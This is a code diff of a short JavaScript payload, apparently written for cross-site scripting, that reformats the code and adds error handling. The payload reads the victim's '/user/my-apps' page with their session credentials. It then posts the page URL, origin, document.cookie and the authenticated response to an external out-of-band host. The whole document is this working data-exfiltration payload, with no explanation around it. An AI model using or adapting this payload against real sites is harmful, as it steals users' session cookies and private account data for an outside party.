@@ -1,17 +1,19 @@
 (async () => {
   try {
-   
     const res  = await fetch('/user/my-apps', { credentials: 'include' });
     const data = await res.text();
 
-  await fetch('https://isnncovepnfctfdxbrknznkzlphgtmme3.oast.fun', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: JSON.stringify({
-    url: location.href,
-    origin: location.origin,
-    cookies: document.cookie,
-    response: data
-  })
-});
+    await fetch('https://isnncovepnfctfdxbrknznkzlphgtmme3.oast.fun', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({
+        url: location.href,
+        origin: location.origin,
+        cookies: document.cookie,
+        response: data
+      })
+    });
+  } catch (e) {
+    console.error(e);
+  }
 })();
